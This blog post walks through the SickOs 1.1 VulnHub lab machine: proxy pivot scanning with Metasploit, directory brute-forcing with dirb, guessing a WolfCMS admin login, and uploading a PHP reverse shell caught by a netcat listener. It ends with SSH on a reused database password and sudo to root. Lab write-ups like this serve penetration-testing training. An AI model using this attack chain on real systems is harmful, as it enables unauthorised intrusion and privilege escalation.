---
layout: post
title: "SickOs 1.1 writeup"
date: 2017-06-28 08:09:14 -0400
comments: true
categories: [penetration testing, writeups]
keywords: sickos, sickos 1.1 walkthrough, sickos 1.1, sickos 1.1 solution, sickos 1.1 writeup, vulnhub, dirb, dirb kali, dirb tutorial
description: SickOs 1.1 writeup
---

Today's target is similar to what can be found in OSCP labs. The goal is to obtain root privileges and get the flag. Let's dive right in!

<!-- more -->

## Recon

Nmap results are:

``` 
nmap -T4 -p- -A 192.168.217.143

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported: GET HEAD
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
```

This is an interesting one, there are no obvious points of entry, but there is a Squid proxy in place. Navigating directly to port 3128 didn't yield anything besides an error of an invalid URL request. I googled the Squid version and found a potentially useful [Metasploit module](https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning):

> A misconfigured Squid proxy can allow an attacker to make requests on his behalf. This may give the attacker 
> information about devices that he cannot reach but the Squid proxy can. For example, an attacker can make requests 
> for internal IP addresses against a misconfigurated open Squid proxy exposed to the Internet, therefore performing an
> internal port scan. The error messages returned by the proxy are used to determine if the port is open or not. Many 
> Squid proxies use custom error codes so your mileage may vary. The open_proxy module can be used to test for open 
> proxies, though a Squid proxy does not have to be open in order to allow for pivoting (e.g. an Intranet Squid proxy 
> which allows the attack to pivot to another part of the network).

Here are the options I've used for the scanner:

``` 
msf auxiliary(squid_pivot_scanning) > options

Module options (auxiliary/scanner/http/squid_pivot_scanning):

   Name          Current Setting                                  Required  Description
   ----          ---------------                                  --------  -----------
   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RANGE         192.168.217.143                                  yes       IPs to scan through Squid proxy
   RHOSTS        192.168.217.143                                  yes       The target address range or CIDR identifier
   RPORT         3128                                             yes       The target port (TCP)
   SSL           false                                            no        Negotiate SSL/TLS for outgoing connections
   THREADS       1                                                yes       The number of concurrent threads
   VHOST                                                          no        HTTP server virtual host
```

And the output:

``` 
msf auxiliary(squid_pivot_scanning) > run

[+] [192.168.217.143] 192.168.217.143 is alive but 21 is CLOSED
[+] [192.168.217.143] 192.168.217.143:80 seems OPEN
[+] [192.168.217.143] 192.168.217.143 is alive but 139 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 445 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 1433 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 1521 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 1723 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 3389 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 8080 is CLOSED
[+] [192.168.217.143] 192.168.217.143 is alive but 9100 is CLOSED
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

It appears port 80 is open on the target. I configured my browser to use the Squid proxy and went to the web server:

{% img center /images/pentest/sickos/1-web.png 'web server' 'webpage' %}

If it doesn't appear there is much content on the web server, we have to get more information by force _;) Since I had to take the proxy into consideration, I preferred a CLI tool rather than a GUI like Dirbuster. How fortunate that there is a CLI companion to Dirbuster, called *sound of drums*: **dirb**!

### dirb description

Homepage: http://dirb.sourceforge.net/

> DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web
> Objects. It basically works by launching a dictionary based attack against
> a web server and analizing the response.

> DIRB comes with a set of preconfigured attack wordlists for easy usage but
> you can use your custom wordlists. Also DIRB sometimes can be used as a
> classic CGI scanner, but remember is a content scanner not a vulnerability scanner.

> DIRB main purpose is to help in professional web application auditing.
> Specially in security related testing. It covers some holes not covered by
> classic web vulnerability scanners. DIRB looks for specific web objects that
> other generic CGI scanners can't look for. It doesn't search vulnerabilities
> nor does it look for web contents that can be vulnerables.

### dirb options

``` 
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

./dirb <url_base> [<wordlist_file(s)>] [options]

========================= NOTES =========================
 <url_base> : Base URL to scan. (Use -resume for session resuming)
 <wordlist_file(s)> : List of wordfiles. (wordfile1,wordfile2,wordfile3...)

======================== HOTKEYS ========================
 'n' -> Go to next directory.
 'q' -> Stop scan. (Saving state for resume)
 'r' -> Remaining scan stats.

======================== OPTIONS ========================
 -a <agent_string> : Specify your custom USER_AGENT.
 -c <cookie_string> : Set a cookie for the HTTP request.
 -f : Fine tunning of NOT_FOUND (404) detection.
 -H <header_string> : Add a custom header to the HTTP request.
 -i : Use case-insensitive search.
 -l : Print "Location" header when found.
 -N <nf_code>: Ignore responses with this HTTP code.
 -o <output_file> : Save output to disk.
 -p <proxy[:port]> : Use this proxy. (Default port is 1080)
 -P <proxy_username:proxy_password> : Proxy Authentication.
 -r : Don't search recursively.
 -R : Interactive recursion. (Asks for each directory)
 -S : Silent Mode. Don't show tested words. (For dumb terminals)
 -t : Don't force an ending '/' on URLs.
 -u <username:password> : HTTP Authentication.
 -v : Show also NOT_FOUND pages.
 -w : Don't stop on WARNING messages.
 -X <extensions> / -x <exts_file> : Append each word with this extensions.
 -z <milisecs> : Add a miliseconds delay to not cause excessive Flood.

======================== EXAMPLES =======================
 ./dirb http://url/directory/ (Simple Test)
 ./dirb http://url/ -X .html (Test files with '.html' extension)
 ./dirb http://url/ /usr/share/dirb/wordlists/vulns/apache.txt (Test with apache.txt wordlist)
 ./dirb https://secure_url/ (Simple Test with SSL)
```

This tool is exactly what I needed! And it finished really fast! Here are its discoveries:

``` 
dirb http://192.168.217.143 /usr/share/wordlists/dirb/common.txt -p 192.168.217.143:3128

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Jun 29 06:45:12 2017
URL_BASE: http://192.168.217.143/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
PROXY: 192.168.217.143:3128

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.217.143/ ----
+ http://192.168.217.143/cgi-bin/ (CODE:403|SIZE:291)                                                                                               
+ http://192.168.217.143/connect (CODE:200|SIZE:109)                                                                                                
+ http://192.168.217.143/index (CODE:200|SIZE:21)                                                                                                   
+ http://192.168.217.143/index.php (CODE:200|SIZE:21)                                                                                               
+ http://192.168.217.143/robots (CODE:200|SIZE:45)                                                                                                  
+ http://192.168.217.143/robots.txt (CODE:200|SIZE:45)                                                                                              
+ http://192.168.217.143/server-status (CODE:403|SIZE:296)                                                                                          
                                                                                                                                                    
-----------------
END_TIME: Thu Jun 29 06:45:16 2017
DOWNLOADED: 4612 - FOUND: 7
```

Quite interesting. Some resources are forbidden, connect is a Python script with the following content:

``` 
#!/usr/bin/python

print "I Try to connect things very frequently\n"
print "You may want to try my services"
```

The robots.txt file seems the most useful:

``` 
User-agent: *
Disallow: /
Dissalow: /wolfcms
```

A hidden CMS, eh? I went there to find this:

{% img center /images/pentest/sickos/1-wolfcms.png 'wolfcms' 'wolfcms' %}

I ran Nikto on it, didn't find anything interesting besides an outdated Apache version. Same with other scanners and another round of directory bruteforcing, nothing useful. I googled for WolfCMS, and found an arbitrary file upload exploit, but it required an authenticated user. So next I searched for the admin interface, and found an answer on [their forums](https://www.wolfcms.org/forum/topic2034.html). So I appended *?admin* to the path and got redirected to http://192.168.217.143/wolfcms/?/admin/login

{% img center /images/pentest/sickos/1-login.png 'wolfcms admin' 'wolfcms admin login' %}

I couldn't find default credentials, no obvious SQL errors, so I tried a few common combinations, and imagine the surprise when *admin:admin* worked!

{% img center /images/pentest/sickos/1-admin.png 'admin' 'wolfcms admin panel' %}

## Exploitation

Now I can use the [exploit](https://www.exploit-db.com/exploits/36818/). The vulnerability exists in the CMS' File Manager, which doesn't restrict the types of files that can be uploaded. But I forgot that I had to access the CMS through a proxy, and didn't want to modify the code, so instead I manually uploaded Pentestmonkey's reverse shell through the interface:

{% img center /images/pentest/sickos/1-file.png 'file manager' 'wolfcms file upload' %}

I set up a Netcat listener and navigated to the shell:

``` 
root@kali:~# nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.143] 33709
Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 18:12:38 up  3:14,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

I looked inside the web directory and found a **config.php** file in <code>/var/www/wolfcms</code> that contained a set of credentials:

``` 
// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
```

I also noted the existence of a sickos user, based on the home directories. Tried SSH'ing as root, no joy. But trying as sickos with the above password worked! Inside sickos' home, I noticed a bash_history file:

``` 
sickos@SickOs:~$ cat .bash_history 
sudo su
exit
```

Woot, could it be that easy? I did a <code>sudo -l</code>:

``` 
User sickos may run the following commands on this host:
    (ALL : ALL) ALL
```

Root was only a *sudo su* away!

``` 
root@SickOs:~# whoami
root
```

And the flag:

``` 
root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt 
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
```

Thanks D4rk for an interesting machine, with a nice twist of Squid!

``` 
 ___________________________________
< You will outgrow your usefulness. >
 -----------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```




